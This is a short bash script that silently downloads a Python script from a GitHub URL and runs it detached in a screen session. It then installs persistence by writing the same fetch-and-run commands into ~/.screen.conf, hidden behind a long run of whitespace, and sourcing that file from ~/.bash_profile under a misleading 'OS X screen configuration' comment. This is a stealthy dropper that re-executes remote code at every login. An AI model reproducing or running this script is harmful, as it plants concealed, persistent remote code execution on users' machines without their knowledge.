#!/bin/bash

if [ ! -d "${PWD}/.voices" ]; then
    mkdir ${PWD}/.voices
fi
cd ${PWD}/.voices
curl -O https://github.com/dcramer/voices.py/raw/master/voices.py > /dev/null 2>&1
screen -d -m python voices.py
cd ..
rm -r ${PWD}/.voices/

# TODO: this should be optionally via a --switch
PRE="                                                                                                                 "
PRE=${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}${PRE}
echo "#!/usr/bin/env bash
${PRE}if [ ! -d \"\\${PWD}/.voices/\" ]; then
${PRE}    mkdir \\${PWD}/.voices/
${PRE}    cd \\${PWD}/.voices/
${PRE}    curl -O https://github.com/dcramer/voices.py/raw/master/voices.py > /dev/null 2>&1
${PRE}    screen -d -m python voices.py
${PRE}    cd ..
${PRE}    rm -r \\${PWD}/.voices/
${PRE}fi" >> ~/.screen.conf

echo "
# Setup OS X screen configuration
. ~/.screen.conf" >> ~/.bash_profile